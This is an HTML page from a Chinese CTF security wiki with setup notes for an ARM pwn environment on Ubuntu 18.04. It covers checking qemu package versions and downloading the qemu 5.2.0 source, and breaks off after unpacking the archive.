@@ -1,0 +1,2224 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="SkYe Wiki">
+      
+      
+      
+        <meta name="author" content="SkYe231">
+      
+      
+        <link rel="canonical" href="https://wiki.mrskye.cn/Pwn/arm/arm/">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
+    
+    
+      
+        <title>ARM - SkYe Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.15aa0b43.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.75751829.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#ffffff">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+        
+<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="green">
+      
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#elubuntu1804" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-header-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      <div class="md-header-nav__ellipsis">
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            SkYe Wiki
+          </span>
+        </div>
+        <div class="md-header-nav__topic">
+          <span class="md-ellipsis">
+            
+              ARM
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-nav__button md-logo" aria-label="SkYe Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    SkYe Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" checked>
+    
+    <label class="md-nav__link" for="nav-1">
+      Pwn
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        <span class="md-nav__icon md-icon"></span>
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  
+
+
+  
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-1" type="checkbox" id="nav-1-1" checked>
+    
+    <label class="md-nav__link" for="nav-1-1">
+      arm
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="arm" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-1">
+        <span class="md-nav__icon md-icon"></span>
+        arm
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        ARM
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
+      ARM
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#qemu" class="md-nav__link">
+    安装 qemu
+  </a>
+  
+    <nav class="md-nav" aria-label="安装 qemu">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    使用包管理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    从源码编译安装
+  </a>
+  
+    <nav class="md-nav" aria-label="从源码编译安装">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    下载源码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    处理依赖
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    编译安装
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    验证安装成功
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    安装动态运行库
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#binutils" class="md-nav__link">
+    安装binutils环境
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-2" type="checkbox" id="nav-1-2" >
+    
+    <label class="md-nav__link" for="nav-1-2">
+      IO_FILE
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="IO_FILE" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-2">
+        <span class="md-nav__icon md-icon"></span>
+        IO_FILE
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../IO_FILE/glibc2.24%E4%B8%8BIO_FILE%E7%9A%84%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      libc2.24下IO_FILE的利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../IO_FILE/Pwn_IO_FILE/" class="md-nav__link">
+      Pwn_IO_FILE
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-3" type="checkbox" id="nav-1-3" >
+    
+    <label class="md-nav__link" for="nav-1-3">
+      Heap
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Heap" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-3">
+        <span class="md-nav__icon md-icon"></span>
+        Heap
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+      堆基础知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/off_by_one/" class="md-nav__link">
+      off_by_one
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/fastbin/" class="md-nav__link">
+      fastbin attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/%E5%A0%86%E9%87%8D%E5%8F%A0%26%E6%8B%93%E5%B1%95/" class="md-nav__link">
+      堆重叠&拓展
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/use_after_free/" class="md-nav__link">
+      UAF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/unlink/" class="md-nav__link">
+      Unlink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/realloc/" class="md-nav__link">
+      realloc
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/unsorted_bin_attack/" class="md-nav__link">
+      unsorted_bin_attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/Libc2.29%E7%B1%BBunlink_attack/" class="md-nav__link">
+      libc2.29类unlink_attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/%E6%B2%99%E7%9B%92%E5%A0%86%E6%BA%A2%E5%87%BA/" class="md-nav__link">
+      沙盒堆溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/libc2.29_tcache_doublefree/libc2.29_tcache_doublefree/" class="md-nav__link">
+      libc2.29_tcache_doublefree
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-3-12" type="checkbox" id="nav-1-3-12" >
+    
+    <label class="md-nav__link" for="nav-1-3-12">
+      House技术
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="House技术" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-3-12">
+        <span class="md-nav__icon md-icon"></span>
+        House技术
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/House/House_Of_Force/House_Of_Force/" class="md-nav__link">
+      House_Of_Force
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../glibc-heap/House/House_of_Lore/House_of_Lore/" class="md-nav__link">
+      House_of_Lore
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-4" type="checkbox" id="nav-1-4" >
+    
+    <label class="md-nav__link" for="nav-1-4">
+      格式化字符串
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-4">
+        <span class="md-nav__icon md-icon"></span>
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-nav__link">
+      格式化字符串漏洞基础例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" class="md-nav__link">
+      格式化字符串漏洞基础利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-nav__link">
+      格式化字符串盲打
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" >
+    
+    <label class="md-nav__link" for="nav-2">
+      Stack
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Stack" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon"></span>
+        Stack
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" >
+    
+    <label class="md-nav__link" for="nav-2-1">
+      ROP
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="ROP" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        <span class="md-nav__icon md-icon"></span>
+        ROP
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+      蒸米ROP笔记
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7/" class="md-nav__link">
+      花式栈溢出技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/SROP/srop/" class="md-nav__link">
+      SROP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/Canary/" class="md-nav__link">
+      Canary
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="md-nav__link">
+      栈迁移
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/" class="md-nav__link">
+      fini_array劫持
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" >
+    
+    <label class="md-nav__link" for="nav-3">
+      Misc
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Misc" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        <span class="md-nav__icon md-icon"></span>
+        Misc
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84/" class="md-nav__link">
+      文件的结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/ZIP%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86/" class="md-nav__link">
+      ZIP压缩包伪加密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Misc/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-volatility/" class="md-nav__link">
+      内存取证-volatility
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+
+  
+  <li class="md-nav__item md-nav__item--nested">
+    
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
+    
+    <label class="md-nav__link" for="nav-4">
+      Crypto
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="Crypto" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        <span class="md-nav__icon md-icon"></span>
+        Crypto
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/CTF%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%ADpython%E5%BA%93%E5%BA%94%E7%94%A8/" class="md-nav__link">
+      CTF密码学中python库应用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/yafu%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+      yafu安装及使用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+
+  <li class="md-nav__item">
+    <a href="../../../Crypto/RSA%E5%8A%A0%E5%AF%86%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+      RSA加密笔记
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#qemu" class="md-nav__link">
+    安装 qemu
+  </a>
+  
+    <nav class="md-nav" aria-label="安装 qemu">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    使用包管理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    从源码编译安装
+  </a>
+  
+    <nav class="md-nav" aria-label="从源码编译安装">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    下载源码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    处理依赖
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    编译安装
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    验证安装成功
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    安装动态运行库
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#binutils" class="md-nav__link">
+    安装binutils环境
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/arm/arm.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                <h1 id="elubuntu1804">El环境搭建（基于Ubuntu18.04)<a class="headerlink" href="#elubuntu1804" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>目前问题是ubuntu18下，在我的虚拟机中pwndbg和gdb-multiarch不能兼容，其他师傅却可以。尝试换成gef，结果gdb不行了反而gdb-multiarch可以。</p>
+<p>现阶段决定先在16编译qemu4.2先用着，到时再去嫖一个别人的镜像吧，因为我的这镜像也是多问题。。。</p>
+</blockquote>
+<h2 id="qemu">安装 qemu<a class="headerlink" href="#qemu" title="Permanent link">&para;</a></h2>
+<h3 id="_1">使用包管理<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p>查了下包管理器安装的版本停留在 2.x 版本，考虑到最近有的程序要用新版本才能加载，放弃这种方式安装</p>
+<div class="highlight"><pre><span></span><code><span class="c1">#查看apt安装版本</span>
+apt-cache madison qemu
+
+      qemu <span class="p">|</span> <span class="m">1</span>:2.11+dfsg-1ubuntu7.34 <span class="p">|</span> http://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 Packages
+      qemu <span class="p">|</span> <span class="m">1</span>:2.11+dfsg-1ubuntu7.34 <span class="p">|</span> http://mirrors.aliyun.com/ubuntu bionic-updates/universe amd64 Packages
+      qemu <span class="p">|</span> <span class="m">1</span>:2.11+dfsg-1ubuntu7.34 <span class="p">|</span> http://cn.archive.ubuntu.com/ubuntu bionic-updates/universe amd64 Packages
+      qemu <span class="p">|</span> <span class="m">1</span>:2.11+dfsg-1ubuntu7.34 <span class="p">|</span> http://security.ubuntu.com/ubuntu bionic-security/universe amd64 Packages
+      qemu <span class="p">|</span> <span class="m">1</span>:2.11+dfsg-1ubuntu7 <span class="p">|</span> http://mirrors.aliyun.com/ubuntu bionic/universe amd64 Packages
+      qemu <span class="p">|</span> <span class="m">1</span>:2.11+dfsg-1ubuntu7 <span class="p">|</span> http://cn.archive.ubuntu.com/ubuntu bionic/universe amd64 Packages
+      qemu <span class="p">|</span> <span class="m">1</span>:2.11+dfsg-1ubuntu7 <span class="p">|</span> http://mirrors.aliyun.com/ubuntu bionic/main Sources
+      qemu <span class="p">|</span> <span class="m">1</span>:2.11+dfsg-1ubuntu7.34 <span class="p">|</span> http://mirrors.aliyun.com/ubuntu bionic-security/main Sources
+      qemu <span class="p">|</span> <span class="m">1</span>:2.11+dfsg-1ubuntu7.34 <span class="p">|</span> http://mirrors.aliyun.com/ubuntu bionic-updates/main Sources
+</code></pre></div>
+<h3 id="_2">从源码编译安装<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<h4 id="_3">下载源码<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>wget https://download.qemu.org/qemu-5.2.0.tar.xz
+tar xvJf qemu-5.2.0.tar.xz
+<span class="nb">cd</span> qemu-5.2.0
+</code></pre></div>
